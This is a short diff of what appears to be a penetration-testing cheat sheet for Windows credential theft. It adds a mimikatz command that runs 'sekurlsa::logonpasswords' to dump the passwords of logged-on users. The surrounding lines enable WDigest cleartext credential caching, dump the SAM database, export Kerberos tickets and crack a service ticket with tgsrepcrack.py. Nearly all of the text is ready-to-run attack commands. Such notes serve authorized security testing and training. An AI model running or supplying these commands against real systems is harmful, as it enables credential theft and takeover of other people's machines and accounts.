@@ -258,6 +258,9 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 //$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "token::elevate" "lsadump::sam" exit
 ```
 ```bash
+//$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+```
+```bash
 //$source_ip/$smb_share/tools_windows/mimikatz.exe log version  "privilege::debug" "kerberos::list /export" exit
 tgsrepcrack.py wordlist.txt 1-40a50000-Offse c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```
